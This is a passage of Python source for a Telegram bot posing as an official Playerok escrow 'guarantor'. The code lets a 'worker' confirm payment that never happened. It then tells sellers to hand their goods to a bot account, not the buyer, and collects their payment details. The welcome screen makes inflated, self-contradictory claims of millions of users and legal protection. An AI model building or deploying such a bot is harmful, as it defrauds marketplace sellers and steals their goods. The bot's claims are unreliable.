        f"💳 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ (ГАРАНТ):\n{guarantor_details}\n\n"
        f"✅ После перевода средств нажмите кнопку подтверждения:"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я подтвердил оплату", callback_data=f"confirm_payment_{deal_id}")],
        [InlineKeyboardButton(text="◀️ Назад в меню", callback_data="back_to_main")]
    ])
    
    await message.answer(deal_info, reply_markup=keyboard)

# ========== ПОДТВЕРЖДЕНИЕ ОПЛАТЫ ==========
@dp.callback_query(F.data.startswith("confirm_payment_"))
async def confirm_payment(callback: CallbackQuery):
    deal_id = callback.data.replace("confirm_payment_", "")
    
    if not await is_worker(callback.from_user.id):
        await callback.answer("❌ Вы не можете подтвердить оплату", show_alert=True)
        return
    
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM deals WHERE id = ?", (deal_id,))
    deal = cursor.fetchone()
    
    if not deal:
        await callback.answer("❌ Сделка не найдена", show_alert=True)
        conn.close()
        return
    
    seller_id = deal[1]
    
    if deal[7] == 'paid':
        await callback.answer("❌ Сделка уже подтверждена", show_alert=True)
        conn.close()
        return
    
    cursor.execute("UPDATE deals SET status = 'paid', confirmed_by = ? WHERE id = ?", (callback.from_user.id, deal_id))
    conn.commit()
    conn.close()
    
    try:
        seller_notification = (
            f"✨ Покупатель оплатил заказ!\n\n"
            f"Товар: {deal[3]}\n"
            f"Сумма: {deal[5]} {deal[6]}\n"
            f"ID сделки: {deal[0]}\n\n"
            f"❗Отправьте товар на аккаунт - @PlayerokGarantBota\n"
            f"Если вы отправите этот подарок напрямую покупателю, то ваши средства не будут выданы\n\n"
            f"После получения товара покупателем деньги будут переведены на ваши реквизиты"
        )
        await bot.send_message(seller_id, seller_notification)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
    
    await callback.message.edit_text(
        f"✅ ОПЛАТА ПОДТВЕРЖДЕНА!\n\n"
        f"Продавец уведомлен.\n"
        f"Сделка ID: {deal_id}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ В меню", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# ========== МОИ СДЕЛКИ ==========
@dp.callback_query(F.data == "my_deals")
async def show_my_deals(callback: CallbackQuery):
    conn = sqlite3.connect('playerok.db', detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM deals WHERE seller_id = ? OR buyer_id = ? ORDER BY created_at DESC LIMIT 10",
        (callback.from_user.id, callback.from_user.id)
    )
    deals = cursor.fetchall()
    conn.close()
    
    if not deals:
        text = "Мои сделки\n\nУ вас пока нет сделок."
    else:
        text = "Мои сделки\n\n"
        for deal in deals:
            status_emoji = {
                'waiting_for_buyer': '⏳',
                'paid': '💰',
                'completed': '✅',
                'cancelled': '❌'
            }.get(deal[7], '❓')
            
            role = "📤 ПРОДАЖА" if deal[1] == callback.from_user.id else "📥 ПОКУПКА"
            
            text += f"{status_emoji} {role}\n"
            text += f"Товар: {deal[3][:30]}...\n"
            text += f"Сумма: {deal[5]} {deal[6]}\n"
            if deal[1] == callback.from_user.id:  # Если это продавец
                text += f"Ваши реквизиты: {deal[9][:30]}...\n"
            text += f"ID: {deal[0]}\n"
            text += "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
    
    try:
        if callback.message.text:
            await callback.message.edit_text(text, reply_markup=get_back_keyboard())
        else:
            await callback.message.answer(text, reply_markup=get_back_keyboard())
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(text, reply_markup=get_back_keyboard())
    
    await callback.answer()

# ========== НАЗАД В ГЛАВНОЕ МЕНЮ ==========
@dp.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    welcome_text = (
        f"👋 Добро пожаловать в {BOT_NAME} 👋\n\n"
        f"🏆 ОФИЦИАЛЬНАЯ ПЛАТФОРМА №1 В СНГ 🏆\n\n"
        f"✅ 1 000 000+ довольных пользователей.\n"
        f"✅ 150 000+ успешных сделок.\n"
        f"✅ Активная поддержка (24/7).\n"
        f"✅ Официальное представительство.\n\n"
        f"🔐 ГАРАНТИИ БЕЗОПАСНОСТИ 🔐\n\n"
        f"🔰 Юридическая защита каждой сделки.\n"
        f"🔰 Арбитраж при спорных ситуациях.\n"
        f"🔰 Анонимность данных.\n\n"
        f"⚡️ ПРЕИМУЩЕСТВА ПЛАТФОРМЫ ⚡️\n\n"
        f"🏆 Мгновенные выплаты на любые карты.\n"
        f"🏆 Более 5 млн пользователей.\n"
        f"🏆 Активный арбитраж решающий проблемы.\n"
        f"🏆 Минимальная комиссия.\n\n"
        f"📊 СТАТИСТИКА ПЛАТФОРМЫ 📊\n\n"
        f"🖇 1000+ активных сделок.\n"
        f"🖇 Средний чек: 800-4000₽.\n"
        f"🖇 Общий оборот: $50M.\n"
        f"🖇 Статистика обновляется каждый день.\n\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n"
        f"👇 Выберите нужный раздел ниже: 👇"
    )
    
    try:
        if callback.message.text:
            await callback.message.edit_text(welcome_text, reply_markup=get_main_keyboard())
        else:
            await callback.message.answer(welcome_text, reply_markup=get_main_keyboard())
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await callback.message.answer(welcome_text, reply_markup=get_main_keyboard())
    
    await callback.answer()

# ========== ОБРАБОТКА СООБЩЕНИЙ ==========
@dp.message()
async def handle_messages(message: Message):
    state = await dp.storage.get_state(key=message.from_user.id)
    if state:
        return
    
    await message.answer("Используйте /start для начала работы с ботом", reply_markup=get_main_keyboard())

async def main():
    init_db()
    print(f"\n{'-'*40}")
    print(f"{BOT_NAME} Бот запущен!")
    print(f"Бот: @{(await bot.get_me()).username}")
    print(f"\nСХЕМА РАБОТЫ:")
    print(f"• Продавец выбирает валюту")
    print(f"• Продавец вводит свои реквизиты")
    print(f"• Продавец заполняет информацию о товаре")
    print(f"• Покупатель видит реквизиты ГАРАНТА")
    print(f"• Воркер подтверждает оплату (команда /work2dx)")
    print(f"{'-'*40}\n")
    await dp.start_polling(bot)

if __name__ == "__main__":

    asyncio.run(main())

